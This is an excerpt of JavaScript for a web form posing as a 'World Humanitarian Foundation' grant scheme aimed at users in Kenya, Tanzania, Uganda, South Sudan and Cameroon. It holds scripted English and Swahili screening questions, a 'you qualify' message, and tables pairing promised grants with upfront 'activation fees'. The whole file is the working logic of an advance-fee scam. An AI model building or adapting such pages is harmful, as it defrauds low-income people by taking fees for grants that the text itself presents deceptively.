        ...
        const packages = {
            ...
            Uganda: {
                currency: "Ugx",
                note: "Which promotion are you capable of paying its activation fee?",
                options: [
            ...
            SouthSudan: {
                currency: "SSP",
                note: "Which of the awards below are you capable of paying its activation fee?",
                options: [
            ...
            Cameroon: {
                currency: "XAF",
                note: "International Humanitarian Fund: Grant Categories and Registration Fees",
                options: [
            ...
            Kenya: {
                ...
                options: [
                    {val: "65000_1590", text: "65,000/- Activation fee...is Ksh1,590", grant: "65,000", fee: "1,590"},
                    {val: "95000_1990", text: "95,000/- Activation fee...IS KSH1,990", grant: "95,000", fee: "1,990"},
                    {val: "125000_2990", text: "125,000/- Activation fee.. IS KSH2,990", grant: "125,000", fee: "2,990"},
                    {val: "150000_3990", text: "150,000/- Activation fee..IS KSH3,990", grant: "150,000", fee: "3,990"},
                    {val: "175000_4990", text: "175,000/- Activation fee...IS KSH4,990", grant: "175,000", fee: "4,990"},
                    {val: "200000_5990", text: "200,000/- Activation fee...IS KSH5,990", grant: "200,000", fee: "5,990"},
                    {val: "250000_6990", text: "250,000/- Activation fee..IS KSH6,990", grant: "250,000", fee: "6,990"},
                    {val: "300000_7990", text: "300,000/-Activation fee..IS KSH7,990", grant: "300,000", fee: "7,990"},
                    {val: "350000_8990", text: "350,000/-Activation fee..IS KSH8,990", grant: "350,000", fee: "8,990"},
                    {val: "400000_9990", text: "400,000/-Activation fee..IS KSH9,990", grant: "400,000", fee: "9,990"},
                    {val: "450000_10990", text: "450,000/-Activation fee..IS KSH10,990", grant: "450,000", fee: "10,990"},
                    {val: "500000_11990", text: "500,000/-Activation fee..IS KSH11,990", grant: "500,000", fee: "11,990"},
                    {val: "550000_12990", text: "550,000/-Activation fee..IS KSH12,990", grant: "550,000", fee: "12,990"},
                    {val: "600000_13990", text: "600,000/-.Activation fee.IS KSH13,990", grant: "600,000", fee: "13,990"},
                    {val: "650000_14990", text: "650,000/-.Activation fee.IS KSH14,990", grant: "650,000", fee: "14,990"},
                    {val: "750000_15990", text: "750,000/Activation fee...IS KSH15,990", grant: "750,000", fee: "15,990"},
                    {val: "800000_16990", text: "800,000/-.Activation fee.IS KSH16,990", grant: "800,000", fee: "16,990"},
                    {val: "850000_17990", text: "850,000/-.Activation fee.IS KSH17,990", grant: "850,000", fee: "17,990"},
                    {val: "900000_18990", text: "900,000/-Activation fee..IS KSH18,990", grant: "900,000", fee: "18,990"},
                    {val: "950000_19990", text: "950,000/-Activation fee..IS KSH19,990", grant: "950,000", fee: "19,990"},
                    {val: "1000000_20990", text: "1,000,000/-Activation fee..IS KSH20,990", grant: "1,000,000", fee: "20,990"}
                ],
        ...
        function handleCountryChange() {
            ...
            if (country === "Tanzania") {
                ...
                document.getElementById('q2-text').innerText = "📌 Salamu. Asante kwa kuwasiliana na HUMANITARIAN PROMOTION FOUNDATION. Mipango yetu inafadhiliwa na michango ya hiari kutoka kwa serikali, taasisi, sekta binafsi na watu binafsi ili kuhakikisha tunakidhi mahitaji ya kila mtu mwenye kipato cha chini. Je, uko tayari kujibu maswali machache kabla ya kupokea Fedha zetu?";
                ...
                document.getElementById('q3-text').innerText = "📌 Ulipata wapi taarifa kuhusu WORLD HUMANITARIAN FOUNDATION FUNDS?";
                ...
                document.getElementById('q4-text').innerText = "📌 Je, ni mara yako ya kwanza kushiriki katika WORLD HUMANITARIAN FOUNDATION FUNDING?";
                
                document.getElementById('q5-text').innerText = "📌 Kuhusiana na FEDHA zetu za WORLD HUMANITARIAN FOUNDATION, unakusudia kufanya nini nazo?";
                ...
                document.getElementById('q2-text').innerText = "📌 Greetings. Thank you for contacting HUMANITERIAN PROMOTION FOUNDATION. HUMANITERIAN PROMOTION programs are supported by voluntary contributions from governments, government agencies, institutions, the private sector and individuals. This diverse array of funding sources enables us to fulfill our mission to ensure the needs of everyone, especially those with low income levels. Let me know if you are ready to answer few questions before receiving our Funds?";
                document.querySelectorAll('.opt-yes').forEach(el => el.innerText = "Yes");
                document.querySelectorAll('.opt-no').forEach(el => el.innerText = "No");

                document.getElementById('q3-text').innerText = "📌 Where did you hear about the WORLD HUMANITARIAN FOUNDATION FUNDS?";
                ...
                document.getElementById('q4-text').innerText = "📌 Is it your first time you are participating in WORLD HUMANITARIAN FOUNDATION FUNDING?";

                document.getElementById('q5-text').innerText = "📌 Regarding our WORLD HUMANITARIAN FOUNDATION FUNDS, what do you intend to do with the funds?";
        ...
        function setupCountryPackageStep() {
            ...
            if (country === 'Tanzania') {
                ...
                document.getElementById('package-title').innerText = "✔️ CONGRATULATIONS you Qualify 💥☑️✅ Which promotion are you capable of paying its activation fee?";
            } else if (country === 'SouthSudan') {
                document.getElementById('package-title').innerText = "Congratulations you Qualify 💥☑️ Which of the awards below are you capable of paying its activation fee?";
            } else {
                document.getElementById('package-title').innerText = "🎊 Thank you for choosing Promotional WORLD HUMANITARIAN FOUNDATION FUNDING Award Enterprises. Select your Choice:";
            }
